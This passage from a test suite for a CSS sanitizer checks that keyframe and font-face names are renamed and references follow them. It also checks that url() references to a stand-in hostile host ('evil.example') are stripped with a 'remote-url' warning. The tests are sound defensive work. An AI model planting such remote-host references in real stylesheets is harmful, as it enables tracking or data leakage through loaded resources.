    });

    it("reads the size past a font-stretch percentage", () => {
      // `font-stretch` takes a percentage, so the FIRST measurement here is the
      // stretch, not the size. Reading it as the size puts the family list one
      // token early, and the `normal` line-height then joins the run in front
      // of `Brand` — the pair matches no family and the reference is left
      // behind. The word line-height is what makes it observable: a numeric one
      // is skipped as an unnamed node and the family still matches by luck.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") } .a { font: 87.5% 16px/normal Brand }`,
        SCOPE
      );
      expect(out.css).toContain(`font:87.5% 16px/normal"${ns("Brand")}"`);
    });

    it("finds the family after a computed font size", () => {
      // `clamp()` is a size like any other, and a shorthand whose size is a
      // function has to reach its family list the same way.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") }
         .a { font: clamp(1rem, 2vw, 2rem) Brand }`,
        SCOPE
      );
      expect(out.css).toContain(`font:clamp(1rem,2vw,2rem)"${ns("Brand")}"`);
    });

    it("follows a name inside a shorthand fragment held by a custom property", () => {
      // `--anim: fade 1s ease` read by `animation: var(--anim)` is the ordinary
      // way to write one. Matching only a value that is exactly one name leaves
      // the fragment holding the old bare `fade`, and after substitution the
      // browser looks for a keyframes rule that no longer exists.
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } }
         .a { --anim: fade 1s ease; animation: var(--anim) }`,
        SCOPE
      );
      expect(out.css).toContain(`--anim:${ns("fade")} 1s ease`);
    });

    it("leaves the other tokens of that fragment alone", () => {
      // The same positional reader the `animation` declaration uses, so a
      // stylesheet defining `@keyframes ease` does not turn the timing function
      // of an unrelated custom property into a name.
      const out = sanitizeCustomCss(
        `@keyframes ease { from { opacity: 0 } }
         .a { --anim: fade 1s ease }`,
        SCOPE
      );
      // Byte for byte, including its spacing: a value nothing moved is not
      // written back at all, so the generator never reformats it.
      expect(out.css).toContain("--anim: fade 1s ease");
      // Named exactly: `ns("ease")` alone appears in the renamed `@keyframes`
      // definition too, so a bare containment check would pass regardless.
      expect(out.css).not.toContain(`--anim: fade 1s ${ns("ease")}`);
    });

    it("does not rewrite a custom property holding no name it defined", () => {
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } } .a { --gap: 1px solid red }`,
        SCOPE
      );
      expect(out.css).toContain("--gap: 1px solid red");
    });

    it("finds the size when a function follows the family list", () => {
      // A comma only appears in the family list, so the size is before the
      // first one. Searching the whole value picks the trailing `var()` as the
      // size, which leaves no family range and `Brand` pointing at a name the
      // definition no longer carries.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") }
         .a { font: 16px Brand, var(--fallback) }`,
        SCOPE
      );
      expect(out.css).toContain(`font:16px"${ns("Brand")}",var(--fallback)`);
    });

    it("reads a fragment as a font shorthand when it carries a size", () => {
      // `--font: italic 16px Arial` can only be the `font` shorthand, so the
      // family list starts after the size. Rewriting from the first token turns
      // the style keyword into the private face and the declaration stops
      // meaning italic Arial at all.
      const out = sanitizeCustomCss(
        `@font-face { font-family: italic; src: url("/f.woff2") }
         .a { --font: italic 16px Arial; font: var(--font) }`,
        SCOPE
      );
      expect(out.css).toContain("--font: italic 16px Arial");
    });

    it("keeps a family-list fragment working", () => {
      // The other side of that rule: a fragment with no size is not the `font`
      // shorthand, so it is read as a family list from the start.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") }
         .a { --stack: Brand, serif; font-family: var(--stack) }`,
        SCOPE
      );
      expect(out.css).toContain(`--stack:"${ns("Brand")}",serif`);
    });

    it("emits a renamed identifier CSS can read back", () => {
      // `@keyframes a\\ b` is named `a b`, and the name is compared decoded — so
      // it has to be escaped again on the way out. Written bare it is two
      // tokens, the rule is invalid, and the animation resolves to nothing.
      const out = sanitizeCustomCss(
        `@keyframes a\\ b { from { opacity: 0 } } .a { animation: a\\ b 1s }`,
        SCOPE
      );
      const emitted = escapeIdentifier(ns("a b"));
      expect(emitted).toContain("\\ ");
      expect(out.css).toContain(`@keyframes ${emitted}{`);
      expect(out.css).toContain(`animation:${emitted} 1s`);
    });

    it("leaves a generic family alone when a face is named after one", () => {
      // A face may be called `"serif"`, and CSS keeps it apart from the generic
      // by the quotes. Rewriting the bare keyword would replace the reader's
      // own serif font with the author's private face.
      const out = sanitizeCustomCss(
        `@font-face { font-family: "serif"; src: url("/f.woff2") }
         .a { font-family: serif }`,
        SCOPE
      );
      expect(out.css).toContain(".a{font-family:serif}");
    });

    it("still rewrites that face when it is referenced as a name", () => {
      // The keyword skip must not swallow the real reference: quoted, it is a
      // family name and has to follow the rename.
      const out = sanitizeCustomCss(
        `@font-face { font-family: "serif"; src: url("/f.woff2") }
         .a { font-family: "serif" }`,
        SCOPE
      );
      expect(out.css).toContain(`.a{font-family:"${ns("serif")}"}`);
    });

    it("leaves references alone when the face it named was removed", () => {
      // The face loses its only `src` to the origin policy and is dropped, so
      // nothing defines the private name. `X` may well be an installed font, and
      // rewriting the reference would turn a working fallback into a missing
      // name.
      const out = sanitizeCustomCss(
        `@font-face { font-family: X; src: url("https://evil.example/f.woff2") }
         .a { font-family: X, serif }`,
        SCOPE
      );
      expect(out.css).toContain(".a{font-family:X,serif}");
      expect(out.css).not.toContain("@font-face");
    });

    it("follows a renamed name into a nested rule", () => {
      // A nested rule is `Raw` to this parser, so the declaration walk never
      // sees inside it. Left alone, the definition is renamed while the
      // reference still asks for `fade` — the animation resolves to nothing and
      // nothing in the output says why.
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } } .a { .b { animation: fade 1s } }`,
        SCOPE
      );
      expect(out.css).toContain(`animation:${ns("fade")} 1s`);
      expect(out.css).not.toMatch(/animation:\s*fade\b/);
    });

    it("follows a renamed family into a nested rule too", () => {
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") }
         .a { .b { font-family: Brand, serif } }`,
        SCOPE
      );
      expect(out.css).toContain(`"${ns("Brand")}",serif`);
    });

    it("reaches a name nested more than one level down", () => {
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } } .a { .b { .c { animation: fade 1s } } }`,
        SCOPE
      );
      expect(out.css).toContain(`animation:${ns("fade")} 1s`);
    });

    it("still refuses a remote url inside a keyframe step", () => {
      // The step blocks are ordinary declarations, so the origin policy has to
      // reach them — allowing the at-rule must not open a door beneath it.
      const out = sanitizeCustomCss(
        `@keyframes x { from { background: url("https://evil.example/a.png") } }`,
        SCOPE
      );
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    });
  });

  it("does not repeat one message for every rule that trips it", () => {
    const many = Array.from(
      { length: 5 },
      (_, i) => `.a${i} { background: url("https://evil.example/a") }`
    ).join("\n");
    const out = sanitizeCustomCss(many, SCOPE);
    expect(out.css).not.toContain("evil.example");
    // Same property, same URL: one message. Five identical lines teach nothing
    // and bury anything else the author needs to read.
    expect(out.warnings).toHaveLength(1);
  });

  it("reports through the per-block entry point too", () => {
    const out = sanitizeBlockCss(
      `selector { background: url("https://evil.example/a") }`,
      "nx-pb-abc"
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });
});
